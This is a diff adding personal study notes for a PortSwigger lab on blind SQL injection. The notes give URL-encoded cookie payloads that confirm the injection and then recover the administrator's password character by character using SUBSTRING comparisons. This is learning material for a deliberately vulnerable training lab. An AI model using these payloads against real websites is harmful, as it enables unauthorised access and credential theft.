@@ -190,7 +190,35 @@ More info: https://portswigger.net/web-security/sql-injection/blind
 
 ### Exploiting blind SQL injection by triggering conditional responses
 
+**Lab: Blind SQL injection with conditional responses**
+
 Tracking cookie is injectable, server returns a Welcome Back message if the query returns any rows. Exploit the blind SQLi vulnerability to find the administrator password
+
+Confirm injection:
+
+```
+# %3d is `=` URL encoded
+tracking_cookie_value'+AND+'1'%3d'1
+```
+
+The page shows the "Welcome back!" banner
+
+Find first letter of the administrator password (only lowercase aphanumeric characters):
+
+```
+# Use > and < to find the first character
+tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'m
+tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>+'5
+# Use >= and <= too
+tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+>%3d+'0
+# Use = to confirm the value is correct
+tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),1,1)+%3d+'0
+# Repeat the process by increasing the index in the SUBSTRING function to find the second character
+tracking_cookie_value'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),2,1)+>+'m
+# Repeat ad nauseum
+```
+
+### Error-based SQL injection
 
 ## Second-order SQL injection AKA Stored SQL injection
 
